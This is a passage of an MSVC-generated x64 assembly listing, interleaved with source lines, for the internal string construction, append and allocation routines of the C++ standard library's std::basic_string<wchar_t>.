; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0005b	4c 8d 04 12	 lea	 r8, QWORD PTR [rdx+rdx]
  0005f	49 8b d1	 mov	 rdx, r9

; 3311 :             _Traits::move(_Old_ptr + _Old_size, _Ptr, _Count);

  00062	48 8d 0c 4e	 lea	 rcx, QWORD PTR [rsi+rcx*2]

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00066	e8 00 00 00 00	 call	 memmove

; 3312 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  0006b	66 44 89 34 6e	 mov	 WORD PTR [rsi+rbp*2], r14w
  00070	48 8b 74 24 48	 mov	 rsi, QWORD PTR [rsp+72]
  00075	48 8b 6c 24 40	 mov	 rbp, QWORD PTR [rsp+64]

; 3313 :             return *this;

  0007a	eb 10		 jmp	 SHORT $LN10@operator
$LN11@operator:

; 3314 :         }
; 3315 : 
; 3316 :         return _Reallocate_grow_by(

  0007c	48 8b cb	 mov	 rcx, rbx
  0007f	48 89 54 24 20	 mov	 QWORD PTR [rsp+32], rdx
  00084	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
  00089	48 8b d8	 mov	 rbx, rax
$LN10@operator:
  0008c	0f 57 c0	 xorps	 xmm0, xmm0

; 4999 :     return _STD move(_Left.append(_Right));

  0008f	48 8b c7	 mov	 rax, rdi

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00092	0f 11 07	 movups	 XMMWORD PTR [rdi], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00095	4c 89 77 10	 mov	 QWORD PTR [rdi+16], r14

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  00099	4c 89 77 18	 mov	 QWORD PTR [rdi+24], r14

; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  0009d	0f 10 03	 movups	 xmm0, XMMWORD PTR [rbx]
  000a0	0f 11 07	 movups	 XMMWORD PTR [rdi], xmm0
  000a3	0f 10 4b 10	 movups	 xmm1, XMMWORD PTR [rbx+16]
  000a7	0f 11 4f 10	 movups	 XMMWORD PTR [rdi+16], xmm1

; 5000 : }

  000ab	48 8b 7c 24 58	 mov	 rdi, QWORD PTR [rsp+88]

; 3082 :                 _Right_data._Mysize = 0;

  000b0	4c 89 73 10	 mov	 QWORD PTR [rbx+16], r14

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  000b4	48 c7 43 18 07
	00 00 00	 mov	 QWORD PTR [rbx+24], 7

; 3084 :                 _Right_data._Activate_SSO_buffer();
; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  000bc	66 44 89 33	 mov	 WORD PTR [rbx], r14w

; 5000 : }

  000c0	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  000c5	48 83 c4 30	 add	 rsp, 48			; 00000030H
  000c9	41 5e		 pop	 r14
  000cb	c3		 ret	 0
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z ENDP ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z PROC ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >, COMDAT

; 1584 :     return __builtin_addressof(_Val);

  00000	48 8b c1	 mov	 rax, rcx

; 1585 : }

  00003	c3		 ret	 0
??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z ENDP ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z
_TEXT	SEGMENT
_Left$dead$ = 8
_Right$dead$ = 16
??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z PROC ; std::_Pocca<std::allocator<wchar_t> >, COMDAT

; 1068 :     if constexpr (allocator_traits<_Alloc>::propagate_on_container_copy_assignment::value) {
; 1069 :         _Left = _Right;
; 1070 :     }
; 1071 : }

  00000	c2 00 00	 ret	 0
??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z ENDP ; std::_Pocca<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z PROC ; std::move<std::allocator<wchar_t> &>, COMDAT

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00000	48 8b c1	 mov	 rax, rcx

; 1573 : }

  00003	c3		 ret	 0
??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ENDP ; std::move<std::allocator<wchar_t> &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
_Val1$dead$ = 24
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00000	33 c0		 xor	 eax, eax
  00002	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00008	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0000c	48 89 41 18	 mov	 QWORD PTR [rcx+24], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 1528 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00010	48 8b c1	 mov	 rax, rcx
  00013	c3		 ret	 0
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
this$ = 80
_Arg$ = 88
_Count$ = 96
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>, COMDAT

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN63:
  00000	40 53		 push	 rbx
  00002	55		 push	 rbp
  00003	56		 push	 rsi
  00004	41 57		 push	 r15
  00006	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 2660 :         auto& _My_data = _Mypair._Myval2;
; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0000a	48 bd fe ff ff
	ff ff ff ff 7f	 mov	 rbp, 9223372036854775806 ; 7ffffffffffffffeH
  00014	49 8b d8	 mov	 rbx, r8
  00017	4c 8b fa	 mov	 r15, rdx
  0001a	48 8b f1	 mov	 rsi, rcx
  0001d	4c 3b c5	 cmp	 r8, rbp
  00020	0f 87 fc 00 00
	00		 ja	 $LN62@Construct

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();
; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00026	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
  0002b	48 83 fb 07	 cmp	 rbx, 7
  0002f	77 2e		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  00031	48 89 59 10	 mov	 QWORD PTR [rcx+16], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00035	48 03 db	 add	 rbx, rbx
  00038	4c 8b c3	 mov	 r8, rbx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  0003b	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00043	e8 00 00 00 00	 call	 memcpy

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);
; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

  00048	45 33 f6	 xor	 r14d, r14d
  0004b	66 44 89 34 33	 mov	 WORD PTR [rbx+rsi], r14w
  00050	4c 8b 74 24 20	 mov	 r14, QWORD PTR [rsp+32]

; 2717 :     }

  00055	48 83 c4 28	 add	 rsp, 40			; 00000028H
  00059	41 5f		 pop	 r15
  0005b	5e		 pop	 rsi
  0005c	5d		 pop	 rbp
  0005d	5b		 pop	 rbx
  0005e	c3		 ret	 0
$LN3@Construct:

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  0005f	48 8b c3	 mov	 rax, rbx
  00062	48 89 7c 24 68	 mov	 QWORD PTR [rsp+104], rdi
  00067	48 83 c8 07	 or	 rax, 7
  0006b	45 33 f6	 xor	 r14d, r14d
  0006e	48 3b c5	 cmp	 rax, rbp

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00071	76 10		 jbe	 SHORT $LN8@Construct

; 4763 :             return _Max;

  00073	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0007d	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00081	eb 2e		 jmp	 SHORT $LN48@Construct
$LN8@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00083	b9 0a 00 00 00	 mov	 ecx, 10
  00088	48 8b e8	 mov	 rbp, rax
  0008b	48 3b c1	 cmp	 rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  0008e	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00098	48 0f 42 e9	 cmovb	 rbp, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  0009c	48 8d 4d 01	 lea	 rcx, QWORD PTR [rbp+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  000a0	48 3b c8	 cmp	 rcx, rax
  000a3	77 77		 ja	 SHORT $LN49@Construct

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  000a5	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  000a8	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  000af	72 24		 jb	 SHORT $LN24@Construct
$LN48@Construct:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  000b1	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  000b5	48 3b c1	 cmp	 rax, rcx
  000b8	76 62		 jbe	 SHORT $LN49@Construct

; 90   :         return ::operator new(_Bytes);

  000ba	48 8b c8	 mov	 rcx, rax
  000bd	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  000c2	48 85 c0	 test	 rax, rax
  000c5	74 61		 je	 SHORT $LN33@Construct

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  000c7	48 8d 78 27	 lea	 rdi, QWORD PTR [rax+39]
  000cb	48 83 e7 e0	 and	 rdi, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  000cf	48 89 47 f8	 mov	 QWORD PTR [rdi-8], rax

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  000d3	eb 12		 jmp	 SHORT $LN23@Construct
$LN24@Construct:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  000d5	48 85 c9	 test	 rcx, rcx
  000d8	74 0a		 je	 SHORT $LN25@Construct

; 90   :         return ::operator new(_Bytes);

  000da	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000df	48 8b f8	 mov	 rdi, rax

; 248  :         return _Traits::_Allocate(_Bytes);

  000e2	eb 03		 jmp	 SHORT $LN23@Construct
$LN25@Construct:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  000e4	49 8b fe	 mov	 rdi, r14
$LN23@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2703 :         _My_data._Mysize = _Count;

  000e7	48 89 5e 10	 mov	 QWORD PTR [rsi+16], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000eb	49 8b d7	 mov	 rdx, r15
  000ee	48 03 db	 add	 rbx, rbx

; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();
; 2696 :             return;
; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());
; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws
; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000f1	48 89 3e	 mov	 QWORD PTR [rsi], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000f4	4c 8b c3	 mov	 r8, rbx

; 2704 :         _My_data._Myres  = _New_capacity;

  000f7	48 89 6e 18	 mov	 QWORD PTR [rsi+24], rbp

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000fb	48 8b cf	 mov	 rcx, rdi
  000fe	e8 00 00 00 00	 call	 memcpy

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

  00103	66 44 89 34 3b	 mov	 WORD PTR [rbx+rdi], r14w
  00108	48 8b 7c 24 68	 mov	 rdi, QWORD PTR [rsp+104]
  0010d	4c 8b 74 24 20	 mov	 r14, QWORD PTR [rsp+32]

; 2717 :     }

  00112	48 83 c4 28	 add	 rsp, 40			; 00000028H
  00116	41 5f		 pop	 r15
  00118	5e		 pop	 rsi
  00119	5d		 pop	 rbp
  0011a	5b		 pop	 rbx
  0011b	c3		 ret	 0
$LN49@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0011c	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00121	cc		 int	 3
$LN62@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2670 :             _Xlen_string(); // result too long

  00122	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  00127	cc		 int	 3
$LN33@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00128	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0012d	cc		 int	 3
$LN60@Construct:
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
this$ = 64
_Arg$ = 72
_Count$ = 80
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>, COMDAT

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN61:
  00000	48 89 5c 24 20	 mov	 QWORD PTR [rsp+32], rbx
  00005	55		 push	 rbp
  00006	56		 push	 rsi
  00007	57		 push	 rdi
  00008	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 2660 :         auto& _My_data = _Mypair._Myval2;
; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0000c	48 be fe ff ff
	ff ff ff ff 7f	 mov	 rsi, 9223372036854775806 ; 7ffffffffffffffeH
  00016	49 8b f8	 mov	 rdi, r8
  00019	48 8b ea	 mov	 rbp, rdx
  0001c	48 8b d9	 mov	 rbx, rcx
  0001f	4c 3b c6	 cmp	 r8, rsi
  00022	0f 87 d4 00 00
	00		 ja	 $LN60@Construct

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();
; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00028	49 83 f8 07	 cmp	 r8, 7
  0002c	77 1f		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  0002e	4c 89 41 10	 mov	 QWORD PTR [rcx+16], r8

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00032	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0003a	0f 10 02	 movups	 xmm0, XMMWORD PTR [rdx]
  0003d	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2717 :     }

  00040	48 8b 5c 24 58	 mov	 rbx, QWORD PTR [rsp+88]
  00045	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00049	5f		 pop	 rdi
  0004a	5e		 pop	 rsi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
$LN3@Construct:

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  0004d	48 8b c7	 mov	 rax, rdi
  00050	48 83 c8 07	 or	 rax, 7
  00054	48 3b c6	 cmp	 rax, rsi

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00057	76 10		 jbe	 SHORT $LN8@Construct

; 4763 :             return _Max;

  00059	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00063	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00067	eb 2e		 jmp	 SHORT $LN48@Construct
$LN8@Construct:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00069	b9 0a 00 00 00	 mov	 ecx, 10
  0006e	48 8b f0	 mov	 rsi, rax
  00071	48 3b c1	 cmp	 rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00074	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  0007e	48 0f 42 f1	 cmovb	 rsi, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  00082	48 8d 4e 01	 lea	 rcx, QWORD PTR [rsi+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00086	48 3b c8	 cmp	 rcx, rax
  00089	77 6b		 ja	 SHORT $LN49@Construct

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  0008b	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0008e	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  00095	72 27		 jb	 SHORT $LN24@Construct
$LN48@Construct:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  00097	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  0009b	48 3b c1	 cmp	 rax, rcx
  0009e	76 56		 jbe	 SHORT $LN49@Construct

; 90   :         return ::operator new(_Bytes);

  000a0	48 8b c8	 mov	 rcx, rax
  000a3	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000a8	48 8b c8	 mov	 rcx, rax

